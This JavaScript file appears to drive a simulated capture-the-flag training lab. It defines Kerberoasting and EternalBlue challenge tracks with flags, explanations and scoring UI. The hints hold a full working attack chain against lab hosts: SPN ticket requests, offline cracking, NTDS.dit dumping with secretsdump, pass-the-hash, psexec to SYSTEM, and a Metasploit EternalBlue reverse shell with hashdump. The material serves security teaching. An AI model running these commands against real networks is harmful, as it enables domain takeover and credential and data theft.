'use strict';

// ── Kerberoasting challenges ──────────────────────────────────────────────────
const KERBEROAST_CHALLENGES = [
  {
    id: 1, title: 'Port Scan the DC', pts: 100,
    flag: 'FLAG{dc01_discovered_ports_445_88_389}',
    hint: 'sudo nmap -sV -sC 10.10.10.10',
    explain: 'Nmap scans a target to find open ports — think of it like knocking on every door to see which ones open. The flags -sV and -sC make it also identify what service is running and grab extra info automatically. -p- scans all 65,535 ports so nothing is missed. On a Domain Controller you\'ll see ports like 88 (Kerberos login), 389 (LDAP directory), and 445 (file sharing) — a clear sign this is a Windows AD server. This first scan tells us what we\'re dealing with.',
    done: false,
    check: r => r.id === 'nmap-full',
  },
  {
    id: 2, title: 'SMB Enumeration', pts: 100,
    flag: 'FLAG{corp_local_domain_enumerated}',
    hint: 'enum4linux -a 10.10.10.10',
    explain: 'enum4linux talks to Windows file-sharing (SMB) to pull out information without needing a password. Older servers allow "null sessions" — anonymous connections that leak usernames, group memberships, and the password lockout policy. Knowing the lockout limit (5 attempts) means we can try 4 passwords per account safely. The usernames we find here — john.doe, svc_backup, svc_sql, svc_web — are our targets for the rest of the attack.',
    done: false,
    check: r => r.id === 'enum4linux',
  },
  {
    id: 3, title: 'Validate Credentials', pts: 150,
    flag: 'FLAG{john_doe_authenticated_smb}',
    hint: "crackmapexec smb 10.10.10.10 -u john.doe -p 'Password1!'",
    explain: 'CrackMapExec (CME) tests credentials against a Windows machine. We found john.doe\'s password in a notes file on the workstation, and now we\'re checking if it actually works on the Domain Controller. A [+] result means the login succeeded — we now have a real, valid domain account. This is our first foothold inside the network.',
    done: false,
    check: r => r.id === 'cme-johndoe',
  },
  {
    id: 4, title: 'Find SPNs', pts: 200,
    flag: 'FLAG{3_spns_found_svc_backup_svc_sql_svc_web}',
    hint: "impacket-GetUserSPNs CORP.LOCAL/john.doe:'Password1!' -dc-ip 10.10.10.10",
    explain: 'An SPN links a service (like a database or web app) to the account running it. Any logged-in domain user can list all SPNs — no admin rights needed. When you request a Kerberos ticket for one of these services, the Domain Controller encrypts it using that service account\'s password hash. That encrypted ticket is what we\'ll crack offline. svc_backup, svc_sql, and svc_web are our targets.',
    done: false,
    check: r => r.id === 'spns-enum',
  },
  {
    id: 5, title: 'Request TGS Tickets', pts: 250,
    flag: 'FLAG{tgs_tickets_captured_rc4_etype23}',
    hint: "impacket-GetUserSPNs CORP.LOCAL/john.doe:'Password1!' -dc-ip 10.10.10.10 -request -outputfile hashes.kerberoast",
    explain: 'This is the Kerberoasting attack. We ask the DC for Kerberos service tickets for each SPN account. The DC encrypts each ticket with that account\'s password hash and hands it right to us — no special permissions needed. We save them to a file and crack them offline. The DC never raises an alert because requesting service tickets is completely normal behavior.',
    done: false,
    check: r => r.id === 'spns-request',
  },
  {
    id: 6, title: 'Crack TGS Hashes', pts: 300,
    flag: 'FLAG{svc_backup_cracked_Backup2023}',
    hint: 'john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt',
    explain: 'John the Ripper cracks passwords offline — we never contact the DC again. It takes each captured ticket and tries every password in rockyou.txt (14 million real leaked passwords) until one produces a matching result. Service accounts are often set up once and never changed, so weak passwords like "Backup2023!" can survive for years. When John finds a match, we have the plaintext password.',
    done: false,
    check: r => r.id === 'john-crack' || r.id === 'hashcat',
  },
  {
    id: 7, title: 'Validate svc_backup', pts: 200,
    flag: 'FLAG{svc_backup_backup_operators_group}',
    hint: "crackmapexec smb 10.10.10.10 -u svc_backup -p 'Backup2023!'",
    explain: "CME confirms the cracked password works. The important detail: svc_backup is in the Backup Operators group — a built-in Windows group that can read any file on the system, including protected ones. This was designed for backup software, but attackers abuse it to read NTDS.dit, the Active Directory database that holds every user's password hash. One cracked service account just unlocked the whole domain.",
    done: false,
    check: r => r.id === 'cme-svcbackup',
  },
  {
    id: 8, title: 'Dump NTDS.dit', pts: 400,
    flag: 'FLAG{ntds_dumped_all_domain_hashes}',
    hint: "impacket-secretsdump CORP.LOCAL/svc_backup:'Backup2023!'@10.10.10.10",
    explain: "NTDS.dit is the Active Directory database — it stores the password hashes for every account in the domain. impacket-secretsdump uses svc_backup's privileges to grab a copy of it remotely. The result is a full dump of every user's hash, including Administrator. In a real company with thousands of users, every single one of those accounts is now compromised.",
    done: false,
    check: r => r.id === 'secretsdump',
  },
  {
    id: 9, title: 'Pass-the-Hash', pts: 350,
    flag: 'FLAG{administrator_pth_pwn3d}',
    hint: 'crackmapexec smb 10.10.10.10 -u Administrator -H fc525c9683e8fe067095ba2ddc971889',
    explain: "Windows NTLM authentication never actually sends your password — it sends your password hash as proof of identity. That means if you have the hash, you can log in without knowing the real password. We take Administrator's hash straight from the NTDS dump and pass it to CME with -H. The [+] Pwn3d! response means we have full Domain Admin access — no cracking required.",
    done: false,
    check: r => r.id === 'cme-pth',
  },
  {
    id: 10, title: 'SYSTEM Shell', pts: 500,
    flag: 'FLAG{dc01_compromised_nt_authority_system}',
    hint: 'impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 CORP.LOCAL/Administrator@10.10.10.10',
    explain: "psexec uses the Administrator hash to upload and run a small service on the DC, giving us an interactive shell. That shell runs as NT AUTHORITY\\SYSTEM — the highest privilege level on Windows, above even Administrator. SYSTEM can access everything on the machine and can't be locked out. The domain is fully compromised.",
    done: false,
    check: r => r.id === 'psexec',
  },
  {
    id: 11, title: 'Exfiltrate Loot', pts: 500,
    flag: 'FLAG{23452_customers_pwned_pci_dss_breach_confirmed}',
    hint: 'dir C:\\CORP_DATA  (then: type C:\\CORP_DATA\\Customer\\Credit_Card_Database.csv)',
    explain: "With SYSTEM access on the DC, we can read any file on the server. Companies sometimes store sensitive data on the DC because it's a powerful machine — a huge mistake. Here we find a CSV with 23,452 customer credit card records including card numbers, CVVs, and SSNs. This is a full PCI-DSS breach. The entire attack chain — from a single port scan to stealing customer data — shows how one weak service account password can bring down a whole organization.",
    done: false,
    check: r => r.id === 'loot-exfil',
  },
];

// ── EternalBlue challenges ────────────────────────────────────────────────────
const ETERNALBLUE_CHALLENGES = [
  {
    id: 1, title: 'Discover the Target', pts: 100,
    flag: 'FLAG{win7_host_discovered_10_10_20_10}',
    hint: 'sudo nmap -sn 10.10.20.0/24',
    explain: 'Before we can attack anything we need to know what\'s on the network. A ping sweep with nmap -sn sends ICMP packets to every address in the subnet and reports which ones respond. We find a Windows 7 machine at 10.10.20.10 — Windows 7 is end-of-life and no longer receives security patches, making it a prime target.',
    done: false,
    check: r => r.id === 'nmap-eb-discovery',
  },
  {
    id: 2, title: 'Identify Vulnerability', pts: 150,
    flag: 'FLAG{ms17_010_eternalblue_confirmed}',
    hint: 'sudo nmap -sV --script smb-vuln-ms17-010 10.10.20.10',
    explain: 'MS17-010 is the vulnerability exploited by EternalBlue, originally developed by the NSA and leaked by Shadow Brokers in 2017. It\'s a critical flaw in Windows SMB (file sharing) that allows remote code execution with no authentication at all. The nmap smb-vuln-ms17-010 script checks if the target is unpatched. A "VULNERABLE" result means we can get a shell without any credentials.',
    done: false,
    check: r => r.id === 'nmap-eb-vuln',
  },
  {
    id: 3, title: 'Launch Metasploit', pts: 100,
    flag: 'FLAG{msfconsole_ready}',
    hint: 'msfconsole',
    explain: 'Metasploit is the most widely used exploitation framework in the world. It contains hundreds of pre-built exploits, payloads, and post-exploitation modules. msfconsole is its interactive shell. From here we can search for exploits, configure them, and fire them at targets. Think of it as a toolkit where all the hard exploit code is already written — you just point it at a target.',
    done: false,
    check: r => r.id === 'msfconsole',
  },
  {
    id: 4, title: 'Load EternalBlue Module', pts: 150,
    flag: 'FLAG{eternalblue_module_loaded}',
    hint: 'use exploit/windows/smb/ms17_010_eternalblue',
    explain: 'Metasploit organises exploits into modules by category. exploit/windows/smb/ms17_010_eternalblue is the EternalBlue module — it implements the full SMB exploit chain. The "use" command loads it and sets it as our active module. You\'ll see the prompt change to show the module name, confirming it\'s loaded and ready to configure.',
    done: false,
    check: r => r.id === 'msf-use',
  },
  {
    id: 5, title: 'Configure the Exploit', pts: 150,
    flag: 'FLAG{rhosts_lhost_configured}',
    hint: 'set RHOSTS 10.10.20.10\nset LHOST 10.10.20.5',
    explain: 'Every Metasploit module has options you need to set before running it. RHOSTS is the target IP — the machine we\'re attacking. LHOST is our own IP — where the reverse shell will connect back to. A reverse shell means the target machine reaches out to us, which bypasses most firewalls since outbound connections are usually allowed. show options lets you see all available settings.',
    done: false,
    check: r => r.id === 'msf-set',
  },
  {
    id: 6, title: 'Run the Exploit', pts: 400,
    flag: 'FLAG{meterpreter_session_opened}',
    hint: 'run',
    explain: 'With the options configured, "run" fires the exploit. EternalBlue sends a specially crafted SMB packet that triggers a buffer overflow in the Windows kernel, giving us code execution before any authentication happens. If successful, our payload (Meterpreter) is injected into memory and calls back to our LHOST. Meterpreter is an advanced shell that runs entirely in RAM — it never touches the disk, making it very hard for antivirus to detect.',
    done: false,
    check: r => r.id === 'msf-run',
  },
  {
    id: 7, title: 'Verify Access', pts: 200,
    flag: 'FLAG{nt_authority_system_eternalblue}',
    hint: 'getuid\nsysinfo',
    explain: 'EternalBlue exploits a kernel-level vulnerability, so the shell we get lands directly as NT AUTHORITY\\SYSTEM — the highest privilege on Windows — without any privilege escalation needed. getuid confirms who we are, sysinfo shows the machine details. We\'re fully in control of this machine without ever having a username or password.',
    done: false,
    check: r => r.id === 'msf-getuid',
  },
  {
    id: 8, title: 'Dump Password Hashes', pts: 300,
    flag: 'FLAG{sam_hashes_dumped}',
    hint: 'hashdump',
    explain: 'hashdump reads the SAM (Security Account Manager) database — the local password hash store on every Windows machine. Because we\'re running as SYSTEM we can read it directly. The output shows every local account and their NT hash. These hashes can be cracked offline with john or hashcat, or used directly in Pass-the-Hash attacks against other machines on the network.',
    done: false,
    check: r => r.id === 'msf-hashdump',
  },
  {
    id: 9, title: 'Pillage the Filesystem', pts: 250,
    flag: 'FLAG{secret_docs_exfiltrated}',
    hint: 'shell\ntype C:\\Users\\Administrator\\Desktop\\secret.txt',
    explain: 'From Meterpreter we can drop into a regular Windows command shell with the "shell" command. From there we can browse the filesystem just like we\'re sitting at the machine. The Administrator\'s desktop often has sensitive files left lying around — credentials, internal documents, flags. This step simulates the data exfiltration phase of a real attack.',
    done: false,
    check: r => r.id === 'msf-shell-loot',
  },
];

const CTF = {
  _lab: 'kerberoast',
  _labs: {
    kerberoast: KERBEROAST_CHALLENGES,
    eternalblue: ETERNALBLUE_CHALLENGES,
  },

  get challenges() { return this._labs[this._lab]; },

  _loadState() {
    try {
      const s = JSON.parse(localStorage.getItem('ctf_state_' + this._lab) || '{}');
      this.challenges.forEach(c => { if (s[c.id]) c.done = true; });
    } catch {}
  },

  _saveState() {
    const s = {};
    this.challenges.forEach(c => { if (c.done) s[c.id] = true; });
    localStorage.setItem('ctf_state_' + this._lab, JSON.stringify(s));
  },

  score()    { return this.challenges.filter(c => c.done).reduce((a, c) => a + c.pts, 0); },
  maxScore() { return this.challenges.reduce((a, c) => a + c.pts, 0); },
  doneCount(){ return this.challenges.filter(c => c.done).length; },

  switchLab(labId) {
    if (!this._labs[labId]) return;
    this._lab = labId;
    // Reset SIM state for the new lab
    SIM.windowsShell = false;
    SIM.hashesOnDisk = false;
    SIM.lootExfiltrated = false;
    SIM.msfActive = false;
    SIM.msfModule = null;
    SIM.msfOptions = {};
    SIM.meterpreter = false;
    SIM.ebTarget = '10.10.20.10';
    SIM.user = 'kali';
    SIM.cwd  = '/home/kali';
    TERM_INSTANCES.forEach(t => t._updatePrompt());
    this._loadState();
    this._renderSidebar();
  },

  check(result) {
    if (!result || !result.id) return null;
    for (const c of this.challenges) {
      if (!c.done && c.check(result)) {
        c.done = true;
        this._saveState();
        return c;
      }
    }
    return null;
  },

  reset() {
    this.challenges.forEach(c => c.done = false);
    localStorage.removeItem('ctf_state_' + this._lab);
    SIM.hashesOnDisk = false;
    SIM.windowsShell = false;
    SIM.lootExfiltrated = false;
    SIM.msfActive = false;
    SIM.msfModule = null;
    SIM.msfOptions = {};
    SIM.meterpreter = false;
    SIM.user = 'kali';
    SIM.cwd  = '/home/kali';
    TERM_INSTANCES.forEach(t => t._updatePrompt());
    this._renderSidebar();
  },

  // ── Sidebar UI ─────────────────────────────────────────────────────────────
  _renderSidebar() {
    const list    = document.getElementById('ctf-list');
    const scoreEl = document.getElementById('ctf-score');
    const barEl   = document.getElementById('ctf-bar');
    const progEl  = document.getElementById('ctf-progress-label');
    const maxEl   = document.getElementById('ctf-max');
    if (!list) return;

    scoreEl.textContent = this.score().toLocaleString();
    if (maxEl) maxEl.textContent = ' / ' + this.maxScore().toLocaleString() + ' pts';
    const pct = Math.round(this.score() / this.maxScore() * 100);
    barEl.style.width = pct + '%';
    progEl.textContent = `${this.doneCount()} / ${this.challenges.length} completed`;

    list.innerHTML = this.challenges.map(c => `
      <div class="ctf-item${c.done ? ' done' : ''}" data-cid="${c.id}" style="cursor:pointer">
        <div class="ctf-item-header">
          <div class="ctf-num">${c.done ? '✓' : c.id}</div>
          <div class="ctf-title">${c.title}</div>
          <div class="ctf-pts">${c.pts}pts</div>
          <i class="fa fa-circle-info ctf-info-btn" title="What is this?"></i>
        </div>
        ${c.done
          ? `<div class="ctf-flag">${c.flag}</div>`
          : `<div class="ctf-hint-row"><span class="ctf-hint">${c.hint.split('\n')[0]}</span><button class="ctf-copy-btn" data-cmd="${c.hint.replace(/"/g,'&quot;')}" title="Copy command"><i class="fa fa-copy"></i></button></div>`}
      </div>`
    ).join('');

    list.querySelectorAll('.ctf-item').forEach(el => {
      el.addEventListener('click', e => {
        if (e.target.closest('.ctf-copy-btn')) return;
        const cid = parseInt(el.dataset.cid);
        const ch  = this.challenges.find(c => c.id === cid);
        if (ch) this._showExplain(ch);
      });
    });

    list.querySelectorAll('.ctf-copy-btn').forEach(btn => {
      btn.addEventListener('click', e => {
        e.stopPropagation();
        const cmd = btn.dataset.cmd.split('\n')[0];
        CTF._pasteToTerminal(cmd);
        btn.innerHTML = '<i class="fa fa-check"></i>';
        setTimeout(() => { btn.innerHTML = '<i class="fa fa-copy"></i>'; }, 1500);
      });
    });
  },

  _pasteToTerminal(cmd) {
    const inst = TERM_INSTANCES.find(t => !t._busy && !t._nano) || TERM_INSTANCES[TERM_INSTANCES.length - 1];
    if (!inst) return;
    inst._setInput(cmd);
    inst.focus();
  },

  _showExplain(ch) {
    document.getElementById('ctf-explain-num').textContent   = ch.id;
    document.getElementById('ctf-explain-title').textContent = ch.title;
    document.getElementById('ctf-explain-text').textContent  = ch.explain;
    document.getElementById('ctf-explain-hint').textContent  = ch.hint;
    const copyBtn = document.getElementById('ctf-explain-copy');
    copyBtn.onclick = () => {
      CTF._pasteToTerminal(ch.hint.split('\n')[0]);
      copyBtn.innerHTML = '<i class="fa fa-check"></i> Pasted';
      setTimeout(() => { copyBtn.innerHTML = '<i class="fa fa-copy"></i> Copy'; }, 1500);
    };
    document.getElementById('ctf-explain-modal').classList.remove('hidden');
  },

  showFlagPopup(challenge) {
    document.getElementById('fp-challenge').textContent = challenge.title;
    document.getElementById('fp-flag').textContent = challenge.flag;
    document.getElementById('fp-pts').textContent = `+${challenge.pts} points`;
    document.getElementById('flag-popup').classList.remove('hidden');
    clearTimeout(this._popupTimer);
    this._popupTimer = setTimeout(() => {
      document.getElementById('flag-popup').classList.add('hidden');
    }, 9000);
  },

  init() {
    this._loadState();
    this._renderSidebar();

    document.getElementById('ctf-lab-select').addEventListener('change', e => {
      this.switchLab(e.target.value);
    });

    document.getElementById('ctf-reset-btn').addEventListener('click', () => {
      if (confirm('Reset all CTF progress?')) this.reset();
    });

    const closeExplain = () => document.getElementById('ctf-explain-modal').classList.add('hidden');
    document.getElementById('ctf-explain-close').addEventListener('click', closeExplain);
    document.getElementById('ctf-explain-ok').addEventListener('click', closeExplain);
    document.getElementById('ctf-explain-modal').addEventListener('click', e => {
      if (e.target === document.getElementById('ctf-explain-modal')) closeExplain();
    });

    document.getElementById('ctf-close-btn')?.addEventListener('click', () => {
      document.getElementById('ctf-sidebar').classList.add('collapsed');
    });
  },
};
